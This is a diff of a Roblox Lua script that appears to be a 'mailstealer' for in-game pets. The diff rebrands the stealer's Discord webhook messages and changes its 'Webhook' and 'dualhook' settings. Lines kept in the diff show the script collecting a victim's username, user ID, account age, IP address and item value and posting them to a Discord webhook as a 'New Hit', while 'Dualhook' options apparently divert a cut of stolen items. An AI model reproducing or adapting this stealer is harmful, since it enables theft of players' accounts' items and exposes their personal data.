@@ -9,7 +9,7 @@
 
 getgenv().Settings = {
     User = "larpedyourhuges",
-    Webhook = false, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
+    Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
     MailMessage = ".gg/fatalcm",
     Titanics = {
         Dualhook = true,
@@ -21,7 +21,7 @@ getgenv().Settings = {
     },
     Huges = {
         Dualhook = true,
-        Intensity = 20 --%
+        Intensity = 10 --%
     },
     Pogs = {
         Dualhook = true,
@@ -955,13 +955,13 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     Image = game:GetService("HttpService"):JSONDecode(Image).data[1].imageUrl
     if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
         imgs =
-        "https://cdn.discordapp.com/attachments/1138669050726203405/1140415468629413898/image.png"
+        "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
         data1 = {
             ["content"] = ping,
-            ["username"] = "OmgXFatal mailstealer",
+            ["username"] = "omgXfatal Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Rizz||",
+                ["title"] = "**New Hit** ||With omgXfatal||",
                 ["url"] = "https://discord.gg/fatalcm",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
@@ -971,7 +971,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using OmgXFatalz's Stealer** :moyai:",
+                    ["name"] = "**This data was generated using omgXfatal Scriptz's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1028,10 +1028,10 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
         data1 = {
             ["content"] = ping,
-            ["username"] = "Rizz Scriptz",
+            ["username"] = "OmgzXFatals Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Rizz||",
+                ["title"] = "**New Hit** ||With OmgXfatal||",
                 ["url"] = "https://discord.gg/uSgzNwHDTS",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
